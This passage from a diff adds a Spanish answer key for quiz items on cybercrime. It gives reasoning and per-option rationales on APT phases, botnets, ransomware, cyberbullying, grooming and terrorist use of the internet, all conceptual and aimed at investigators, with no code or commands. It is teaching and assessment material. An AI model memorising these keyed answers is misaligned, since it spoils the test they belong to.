+      "reasoning": "Las webs que distribuyen sin permiso obras protegidas ganan dinero con la publicidad que muestran, con la venta de los correos de sus usuarios y cobrando por descargas prioritarias. Publicar críticas de cine es solo contenido, no una vía de ingresos de ese negocio. Este tema solo menciona la propiedad intelectual de pasada, así que la respuesta se razona con esa lógica del negocio.",
+      "options": {
+        "a": "Incorrecta. La publicidad es la principal fuente de ingresos de estas webs.",
+        "b": "Incorrecta. Vender las direcciones de correo de los usuarios registrados sí es una vía de beneficio.",
+        "c": "Incorrecta. Cobrar por descargas más rápidas o sin espera sí es una vía de beneficio.",
+        "d": "Correcta. Distribuir críticas cinematográficas no genera por sí mismo ingresos; no es una de esas vías."
+      }
+    },
+    "ciberdelitos-t09-11": {
+      "section": "apt",
+      "reasoning": "Recopilar organigramas, proveedores y perfiles de personal clave es la fase de reconocimiento. Sirve para saber a quién atacar y cómo, por ejemplo para preparar un spear phishing creíble. Obtener información no da acceso ni permisos por sí misma.",
+      "options": {
+        "a": "Correcta. El reconocimiento permite elegir la vía de entrada y a las personas objetivo adaptándose a la organización.",
+        "b": "Incorrecta. Saber cosas de la organización no otorga permisos de administrador.",
+        "c": "Incorrecta. Después del reconocimiento hay que interactuar con los sistemas para entrar.",
+        "d": "Incorrecta. La información obtenida no convierte los accesos futuros en autorizados."
+      }
+    },
+    "ciberdelitos-t09-12": {
+      "section": "apt",
+      "reasoning": "En una APT, el atacante instala varias puertas traseras y roba credenciales precisamente para seguir dentro aunque se detecte y neutralice la infección inicial. Eliminar el primer componente no prueba que la presencia se haya erradicado.",
+      "options": {
+        "a": "Incorrecta. Hay otras puertas traseras y credenciales comprometidas que también deben revisarse.",
+        "b": "Incorrecta. Cambiar el nombre de un equipo no invalida las contraseñas robadas.",
+        "c": "Incorrecta. Encontrar una puerta trasera no demuestra que no haya otras; la APT suele instalar varias.",
+        "d": "Correcta. Retirar la infección inicial no significa haber eliminado toda la presencia de una campaña persistente."
+      }
+    },
+    "ciberdelitos-t09-13": {
+      "section": "apt",
+      "reasoning": "En las fases de obtención de credenciales e instalación de utilidades, la APT roba cuentas legítimas e instala herramientas con ellas, para que parezcan acciones de un usuario autorizado. Ver una cuenta real en el registro solo indica qué credencial se usó, no quién estaba detrás ni que hubiera permiso.",
+      "options": {
+        "a": "Incorrecta. Las credenciales robadas siguen funcionando hasta que se cambian; por eso son útiles para el atacante.",
+        "b": "Incorrecta. Instalar herramientas con cuentas válidas es justamente una técnica de persistencia de las APT.",
+        "c": "Correcta. El atacante usa credenciales legítimas robadas sin autorización de su titular.",
+        "d": "Incorrecta. Que aparezca la cuenta no prueba que el administrador aprobara la acción: alguien pudo usar su credencial."
+      }
+    },
+    "ciberdelitos-t09-14": {
+      "section": "apt",
+      "reasoning": "Acceder sucesivamente a otros servidores tras comprometer un puesto es movimiento lateral; enviar fuera archivos comprimidos es extracción de datos. Ambas actividades forman la sexta fase de Mandiant, donde la información sale comprimida y cifrada hacia servidores del atacante.",
+      "options": {
+        "a": "Incorrecta. Nada indica destrucción de soportes: los sistemas siguen funcionando.",
+        "b": "Correcta. Es la combinación de movimiento lateral y extracción de información.",
+        "c": "Incorrecta. Comprar una licencia de compresión no explica los accesos a otros servidores ni la salida de datos.",
+        "d": "Incorrecta. El tamaño de unos archivos no demuestra ninguna actualización legítima."
+      }
+    },
+    "ciberdelitos-t09-15": {
+      "section": "apt",
+      "reasoning": "En la fase de backdoor, el malware recién instalado se pone en contacto con su servidor de mando y control (C&C) para comunicar que la infección ha tenido éxito y que está operativo. Lo hace cifrado para no ser detectado, así que el cifrado no indica que sea legítimo.",
+      "options": {
+        "a": "Correcta. Es la comunicación del implante con su infraestructura de mando y control.",
+        "b": "Incorrecta. Una copia de seguridad no informa a un servidor remoto de que un implante está activo.",
+        "c": "Incorrecta. Una conexión de red no es una autorización judicial.",
+        "d": "Incorrecta. El malware cifra sus conexiones precisamente para ocultarse; el cifrado no garantiza nada."
+      }
+    },
+    "ciberdelitos-t09-16": {
+      "section": "botnet",
+      "reasoning": "El temario cita botnets cuyas órdenes se publicaban como tuits en Twitter, y explica que el canal HTTP es el más usado porque pasa desapercibido. La lección es que el mando puede esconderse en servicios ordinarios y legítimos.",
+      "options": {
+        "a": "Incorrecta. El ejemplo de Twitter demuestra lo contrario: sirven servicios corrientes, no solo protocolos diseñados para malware.",
+        "b": "Incorrecta. Usar una plataforma conocida no hace legítimas las órdenes que se transmiten por ella.",
+        "c": "Incorrecta. Cambiar el canal de mando no elimina los equipos infectados.",
+        "d": "Correcta. El mando y control puede usar servicios aparentemente normales, como una red social."
+      }
+    },
+    "ciberdelitos-t09-17": {
+      "section": "botnet",
+      "reasoning": "Uno de los usos de una botnet son los ataques de denegación de servicio distribuidos (DDoS): el botmaster ordena a los zombis enviar peticiones a la vez. El temario subraya que los usuarios de los equipos infectados ni participan ni se enteran.",
+      "options": {
+        "a": "Incorrecta. El servicio atacado no controla las máquinas que le envían tráfico; las controla el botmaster.",
+        "b": "Incorrecta. La coordinación es precisamente lo que indica que los equipos están infectados y dirigidos.",
+        "c": "Correcta. Los equipos son recursos distribuidos de un DDoS sin que sus usuarios lo sepan.",
+        "d": "Incorrecta. Las peticiones las genera el malware siguiendo órdenes del botmaster, no los usuarios."
+      }
+    },
+    "ciberdelitos-t09-18": {
+      "section": "botnet",
+      "reasoning": "El temario enumera muchos usos de una botnet: spam y phishing, DDoS, distribución de malware, robo de datos, alojar webs de phishing, etc. El botmaster puede encargar a cada zombi distintas tareas según sus órdenes, así que enviar spam y alojar una página falsa no son incompatibles.",
+      "options": {
+        "a": "Incorrecta. Enviar correo no transfiere la propiedad del equipo; el atacante solo lo controla.",
+        "b": "Correcta. Los equipos de una botnet pueden cumplir varios usos según las órdenes que reciban.",
+        "c": "Incorrecta. Nada limita un bot a una sola acción; su función puede cambiar.",
+        "d": "Incorrecta. Alojar una web no impide enviar mensajes desde el mismo equipo."
+      }
+    },
+    "ciberdelitos-t09-19": {
+      "section": "ransomware",
+      "reasoning": "El ransomware cifra los archivos con una clave que tiene el atacante. Desinfectar elimina el programa, pero no descifra lo que ya está cifrado. Por eso el temario dice que muchas veces solo se recupera parte de la información y que lo mejor es tener copias de seguridad.",
+      "options": {
+        "a": "Correcta. Eliminar el malware y recuperar los archivos son problemas distintos.",
+        "b": "Incorrecta. Desinstalar un programa no restaura versiones anteriores de los archivos.",
+        "c": "Incorrecta. Los archivos cifrados siguen necesitando la clave aunque el programa ya no esté.",
+        "d": "Incorrecta. Cerrar la ventana del rescate no deshace el cifrado."
+      }
+    },
+    "ciberdelitos-t09-20": {
+      "section": "ransomware",
+      "reasoning": "El temario insiste en que lo mejor es prevenir con copias de seguridad continuas. Si existen y funcionan, la empresa puede restaurar sus documentos sin pagar ni esperar a que el extorsionador entregue la clave. Pero no prueban que no hubo infección ni sustituyen la investigación.",
+      "options": {
+        "a": "Incorrecta. Tener copias no impide la infección: la infección ya se ha producido.",
+        "b": "Incorrecta. La copia permite recuperar datos, pero no certifica la autenticidad de todos los documentos originales.",
+        "c": "Incorrecta. Sigue siendo necesario investigar cómo entró el malware para que no vuelva a pasar.",
+        "d": "Correcta. Las copias dan una vía de recuperación que no depende de la voluntad del extorsionador."
+      }
+    },
+    "ciberdelitos-t09-21": {
+      "section": "malware",
+      "reasoning": "Uno de los objetivos del malware móvil es enviar mensajes a servicios de tarificación adicional, que generan ingresos al atacante a costa de la factura de la víctima. Por eso hay que investigar el uso fraudulento de las funciones de comunicación, no solo los archivos.",
+      "options": {
+        "a": "Incorrecta. El aspecto de la interfaz no explica los cargos.",
+        "b": "Incorrecta. Imprimir los mensajes sin estudiar su origen no aclara qué los provoca.",
+        "c": "Correcta. Hay que estudiar el abuso de funciones como los SMS de pago, que reportan dinero al atacante.",
+        "d": "Incorrecta. Las funciones telefónicas sí pueden abusarse; es justo lo que describe el temario."
+      }
+    },
+    "ciberdelitos-t09-22": {
+      "section": "ciberacoso",
+      "reasoning": "El temario define el ciberacoso como una agresión psicológica que perdura en el tiempo y exige que sea repetida: un hecho aislado no es ciberacoso. Lo que distingue el caso es, por tanto, la continuidad del hostigamiento.",
+      "options": {
+        "a": "Incorrecta. El ciberacoso no necesita ningún programa malicioso; basta usar las TIC para hostigar.",
+        "b": "Correcta. La repetición y la continuidad en el tiempo diferencian el acoso de un mensaje aislado.",
+        "c": "Incorrecta. El acoso puede venir de varias personas o de perfiles anónimos.",
+        "d": "Incorrecta. Al contrario: el ciberacoso suele continuar un acoso que también existe fuera de la red."
+      }
+    },
+    "ciberdelitos-t09-23": {
+      "section": "ciberacoso",
+      "reasoning": "Si acosador y víctima son menores en edad escolar, es ciberbullying: una prolongación en la red de la intimidación que la víctima sufre en su día a día. El medio digital continúa y amplía el acoso del aula.",
+      "options": {
+        "a": "Correcta. El ámbito digital continúa y amplía el acoso entre iguales iniciado en clase.",
+        "b": "Incorrecta. El acoso no termina con el horario escolar; la red lo extiende a cualquier momento.",
+        "c": "Incorrecta. Los grupos de mensajería amplifican los efectos sobre la víctima, no los impiden.",
+        "d": "Incorrecta. El ciberbullying busca humillar, no robar contraseñas bancarias."
+      }
+    },
+    "ciberdelitos-t09-24": {
+      "section": "grooming",
+      "reasoning": "En la primera fase del grooming, el adulto se hace pasar por un menor de edad parecida, con sus mismos gustos, para conseguir un canal privado (correo o mensajería). Busca un acceso personal y la confianza que le permitan luego abusar.",
+      "options": {
+        "a": "Incorrecta. El adulto miente sobre su identidad; no certifica nada.",
+        "b": "Incorrecta. Al contrario: el objetivo es obtener después información personal del menor.",
+        "c": "Incorrecta. La apariencia amistosa es un engaño, no una protección; la opción confunde el disfraz con la finalidad.",
+        "d": "Correcta. Busca crear un acceso personal y una confianza que faciliten la aproximación abusiva."
+      }
+    },
+    "ciberdelitos-t09-25": {
+      "section": "grooming",
+      "reasoning": "En la fase de acoso, el groomer se quita la máscara y usa las imágenes y la información que obtuvo cuando era de confianza para chantajear al menor. Exigir secreto y amenazar con lo íntimo muestra que la confianza se ha convertido en una herramienta de control.",
+      "options": {
+        "a": "Incorrecta. Es un adulto manipulando a un menor; nunca fue una relación entre iguales.",
+        "b": "Incorrecta. Las conversaciones previas son precisamente la fuente del material para el chantaje.",
+        "c": "Correcta. La confianza y los datos obtenidos se usan como instrumentos de control.",
+        "d": "Incorrecta. La presión y el chantaje anulan cualquier consentimiento."
+      }
+    },
+    "ciberdelitos-t09-26": {
+      "section": "ciberacoso",
+      "reasoning": "Publicar imágenes íntimas de una expareja por venganza es ciberacoso con finalidad personal. El temario explica que la difusión por imitación, sin relación con la obtención, multiplica la humillación, y que la rapidez de difusión y la dificultad de eliminar el contenido amplifican el daño.",
+      "options": {
+        "a": "Incorrecta. El medio digital no impide actuar contra el hostigamiento.",
+        "b": "Correcta. La facilidad de copiar y difundir más allá del primer emisor amplifica el daño.",
+        "c": "Incorrecta. Cada nueva copia aumenta la exposición; no reduce el acceso a las anteriores.",
+        "d": "Incorrecta. La difusión masiva agrava la conducta; no la vuelve inofensiva."
+      }
+    },
+    "ciberdelitos-t09-27": {
+      "section": "terrorismo",
+      "reasoning": "Según la UNODC, los grupos terroristas usan Internet para propaganda, proselitismo, financiación, comunicaciones y preparación de acciones. El temario aclara que no trata el ciberterrorismo contra sistemas, sino el uso de la red como herramienta. Por tanto, el caso muestra usos organizativos y de difusión, no intrusiones técnicas.",
+      "options": {
+        "a": "Correcta. Internet sirve a estos grupos para organizarse y difundir su mensaje, no solo para atacar sistemas.",
+        "b": "Incorrecta. La propaganda y la financiación no exigen controlar el sistema operativo de nadie.",
+        "c": "Incorrecta. Los terroristas usan precisamente servicios públicos (redes sociales, PayPal) con fines ilícitos.",
+        "d": "Incorrecta. La financiación digital son donaciones, ventas o transferencias, no ataques de denegación de servicio."
+      }
+    },
+    "ciberdelitos-t09-28": {
+      "section": "abusos-menores",
+      "reasoning": "El temario enumera las vías de difusión de contenidos de abusos a menores: webs abiertas y cerradas, deep web no indexada, mensajería, foros, correo y redes P2P. Muchas no aparecen en los buscadores, así que la investigación debe incluir esos canales.",
+      "options": {
+        "a": "Incorrecta. La distribución puede hacerse por canales privados aunque no haya web pública.",
+        "b": "Incorrecta. Un grupo cerrado no hace legítimo el contenido; es una de las vías de difusión descritas.",
+        "c": "Incorrecta. Mensajería, correo o P2P también dejan evidencias digitales.",
+        "d": "Correcta. Hay que analizar canales distintos de las webs públicas indexadas, como grupos cerrados y P2P."
+      }
+    },
+    "ciberdelitos-t09-29": {
+      "section": "apt",
+      "reasoning": "La finalidad típica de una APT es el ciberespionaje: extraer información de proyectos industriales o de investigación de forma continua y discreta. No necesita borrar archivos ni tumbar servicios; de hecho, le interesa que todo siga funcionando para no ser descubierta. Atenta contra la confidencialidad, no contra la disponibilidad.",
+      "options": {
+        "a": "Incorrecta. Que los archivos sigan en su sitio no impide que existan copias fuera de la empresa.",
+        "b": "Incorrecta. La continuidad del servicio no prueba que las sesiones sean legítimas; una APT puede usar credenciales robadas.",
+        "c": "Correcta. La extracción silenciosa de información puede ser el objetivo mientras los sistemas siguen disponibles.",
+        "d": "Incorrecta. Muchos accesos no autorizados son silenciosos precisamente para no ser detectados."
+      }
+    },
+    "ciberdelitos-t09-30": {
+      "section": "apt",
+      "reasoning": "Las APT mutan constantemente y actualizan su malware para no ser detectadas por sistemas basados en firmas. Si el código cambia, la firma antigua deja de coincidir, aunque la campaña siga siendo la misma y mantenga su acceso.",
+      "options": {
+        "a": "Incorrecta. Que no aparezca la muestra inicial no demuestra que el entorno esté limpio.",
+        "b": "Correcta. El código y sus huellas cambian mientras la campaña mantiene su objetivo y su acceso.",
+        "c": "Incorrecta. Las variantes nuevas suelen tener firmas distintas; por eso la firma antigua no basta.",
+        "d": "Incorrecta. La mutación no rompe la relación entre las actividades: es la misma campaña adaptándose."
+      }
+    }
+  }
+}
